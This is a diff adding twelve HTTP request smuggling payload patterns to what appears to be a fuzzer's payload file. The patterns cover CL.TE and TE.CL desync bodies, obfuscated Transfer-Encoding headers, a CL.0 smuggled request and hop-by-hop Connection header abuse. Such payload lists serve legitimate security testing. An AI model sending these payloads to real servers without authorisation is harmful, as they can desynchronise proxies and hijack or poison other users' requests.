@@ -1,0 +1,12 @@
+# DEEPHUNT payload class: smuggling (Wave 1 additions, 2026-09-27)
+# Shapes are pattern families; the fuzzer instantiates them.
+CL.TE|Content-Length: 4 + Transfer-Encoding: chunked|body: '1\r\nA\r\n0\r\n\r\n'
+TE.CL|Content-Length: 6 + Transfer-Encoding: chunked|body: '0\r\n\r\nX'
+TE-OBF|Transfer-Encoding: xchunked
+TE-OBF|Transfer-Encoding : chunked
+TE-OBF|Transfer-Encoding:\tchunked
+TE-OBF| Transfer-Encoding: chunked
+TE-OBF|X: x\nTransfer-Encoding: chunked
+CL.0|Content-Length: <len>|body: 'GET /dh-unique-path HTTP/1.1\r\nHost: x\r\n\r\n'
+HOPBYHOP|Connection: Content-Length
+HOPBYHOP|Connection: Transfer-Encoding
